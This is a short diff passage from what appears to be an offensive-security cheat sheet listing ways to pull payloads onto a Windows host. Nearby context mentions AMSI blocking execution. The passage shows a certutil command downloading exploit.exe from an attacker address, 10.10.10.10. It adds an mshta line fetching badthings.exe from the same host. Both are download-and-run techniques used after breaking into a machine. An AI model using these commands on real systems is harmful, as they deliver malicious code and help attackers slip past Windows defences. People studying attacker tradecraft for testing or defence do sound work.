@@ -51,3 +51,6 @@ If you receive any errors it's possible AMSI is preventing execution. Look into 
 
 [Cert Util]
 certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
+
+[mshta]
+mshta http://10.10.10.10/badthings.exe
